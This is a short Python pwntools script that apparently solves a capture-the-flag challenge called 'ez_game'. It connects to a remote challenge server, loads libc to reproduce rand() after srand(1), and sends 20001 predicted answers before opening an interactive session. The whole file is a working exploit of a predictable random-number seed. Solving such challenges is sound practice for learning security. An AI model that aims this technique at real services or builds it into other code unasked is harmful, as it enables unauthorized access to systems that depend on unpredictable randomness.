from pwn import *
#context(os='linux',terminal = ['tmux','sp','-h'],log_level = 'debug')
from ctypes import *

def dbg():
    gdb.attach(p)
    pause()

#p = process('./ez_game')
p = remote('gz.imxbt.cn',20866)
elf = ELF('./ez_game')
libc = cdll.LoadLibrary('./libc.so.6')
#dbg()

libc.srand(1);
result = [0]*20001
for i in range(20001):
    result[i] = str(libc.rand()%7+1)

payload = b'a'
p.sendlineafter(b'username: ',payload)

for i in range(20001):
    p.sendline(result[i])

p.interactive()
